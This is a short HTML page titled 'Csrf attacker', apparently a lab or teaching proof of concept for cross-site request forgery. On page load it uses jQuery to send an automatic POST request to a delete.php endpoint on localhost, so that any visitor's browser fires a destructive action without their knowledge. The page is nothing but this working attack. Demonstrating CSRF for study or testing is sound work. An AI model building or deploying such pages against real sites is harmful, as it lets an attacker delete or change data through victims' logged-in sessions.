<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>Csrf attacker</title>
</head>
<body>
	<script
  src="http://code.jquery.com/jquery-3.3.1.min.js"
  integrity="sha256-FgpCb/KJQlLNfOu91ta32o/NMZxltwRo8QtmkMRdAu8="
  crossorigin="anonymous"></script>

  <script type="text/javascript">
  	
  	$.ajax({
  		'url':'http://localhost:8000/delete.php',
  		'type': 'post'
  	});

  </script>
</body>
</html>